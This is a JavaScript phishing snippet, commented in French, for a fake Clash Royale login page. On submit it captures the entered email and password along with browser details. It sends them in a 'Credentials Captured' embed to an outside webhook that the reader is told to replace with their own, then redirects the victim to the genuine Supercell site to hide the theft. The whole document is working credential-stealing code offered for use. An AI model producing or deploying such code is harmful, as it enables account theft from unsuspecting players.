document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Payload complet avec user-agent, IP, timestamp
    const payload = {
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform
    };
    
    // Envoi vers ton serveur de capture (Discord webhook ou email API)
    fetch('https://hook.eu1.make.com/xxxxx', {  // Remplace par ton webhook
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            "embeds": [{
                "title": "🆕 Clash Royale Credentials Captured",
                "color": 16711680,
                "fields": [
                    {"name": "📧 Email", "value": email, "inline": true},
                    {"name": "🔑 Password", "value": password, "inline": true},
                    {"name": "🕐 Timestamp", "value": new Date().toISOString(), "inline": false},
                    {"name": "🌐 User-Agent", "value": navigator.userAgent.substring(0, 100), "inline": false}
                ]
            }]
        })
    }).then(() => {
        // Redirection vers vrai site Clash Royale après capture
        window.location.href = 'https://supercell.com/fr/games/clashroyale/overview/';
    });
});
